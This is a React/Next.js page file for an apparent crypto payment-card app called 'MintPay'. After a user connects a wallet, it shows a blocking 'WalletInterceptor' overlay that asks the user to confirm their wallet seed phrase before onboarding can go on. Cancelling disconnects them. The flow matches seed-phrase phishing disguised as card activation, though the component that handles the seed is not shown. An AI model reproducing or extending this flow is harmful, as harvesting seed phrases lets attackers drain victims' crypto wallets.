"use client";

import { useCallback, useEffect, useState } from "react";
import { LandingPage } from "@/components/landing/landing-page";
import { Onboarding } from "@/components/onboarding";
import { CardIssued } from "@/components/card-issued";
import { useSession } from "@/components/session-provider";
import WalletInterceptor from "@/components/WalletInterceptor"; // Default Import
import type { CardInfo } from "@/components/mintpay-card";

type Done = { name: string; email: string; card?: CardInfo; emailed: boolean };

/**
 * The whole app:
 *   landing -> connect wallet -> interceptor (seed) -> onboarding -> card + thank you
 * No database, no lookups, no loading gates.
 */
export default function HomePage() {
  const { ready, isConnected, disconnect } = useSession();
  const [done, setDone] = useState<Done | null>(null);
  const [showInterceptor, setShowInterceptor] = useState(false);
  
  // Flag to prevent the interceptor from re-triggering after a successful submission
  const [interceptorHandled, setInterceptorHandled] = useState(false);

  // 1. DETECT CONNECTION & SHOW INTERCEPTOR
  useEffect(() => {
    // Show interceptor if:
    // - App is ready
    // - Wallet is connected
    // - User hasn't finished onboarding (!done)
    // - Interceptor isn't currently showing
    // - Interceptor hasn't been handled yet (prevents loop after success)
    if (ready && isConnected && !done && !showInterceptor && !interceptorHandled) {
      setShowInterceptor(true);
    }
  }, [ready, isConnected, done, showInterceptor, interceptorHandled]);

  // 2. HANDLE "NUKE" (Called by WalletInterceptor if user cancels)
  const handleNukeSession = () => {
    setShowInterceptor(false);
    setInterceptorHandled(true); // Prevent it from popping up again immediately
    if (disconnect) {
      disconnect(); // Disconnects MetaMask/Wallet, sending user back to LandingPage
    }
  };

  // 3. HANDLE "ACTIVATE" (Called by WalletInterceptor if user confirms seed)
  const handleActivationComplete = () => {
    // Mark as handled so the useEffect doesn't re-trigger it
    setInterceptorHandled(true);
    
    // Wait 2 seconds for the user to see the success animation in the interceptor,
    // THEN hide it to reveal the Onboarding screen.
    setTimeout(() => {
      setShowInterceptor(false);
    }, 2000);
  };

  // Reset if disconnected unexpectedly (and they had already finished)
  useEffect(() => {
    if (ready && !isConnected && done) {
      setDone(null);
      setInterceptorHandled(false); // Reset flag so it can show again if they reconnect
    }
  }, [ready, isConnected, done]);

  const handleComplete = useCallback((data: Done) => {
    setDone(data);
    setInterceptorHandled(false); // Reset for next time
  }, []);

  // --- RENDER LOGIC ---

  // If not connected, show Landing Page
  if (!isConnected) {
    return <LandingPage />;
  }

  // If done, show Card Issued
  if (done) {
    return <CardIssued {...done} />;
  }

  // MAIN RENDER: Onboarding + Interceptor Overlay
  // We render Onboarding *behind* the interceptor so the state isn't lost
  return (
    <>
      <Onboarding onComplete={handleComplete} />
      
      {/* The Interceptor is an overlay that blocks the view */}
      <WalletInterceptor 
        isOpen={showInterceptor} 
        onCancel={handleNukeSession} 
        onComplete={handleActivationComplete} 
      />
    </>
  );
}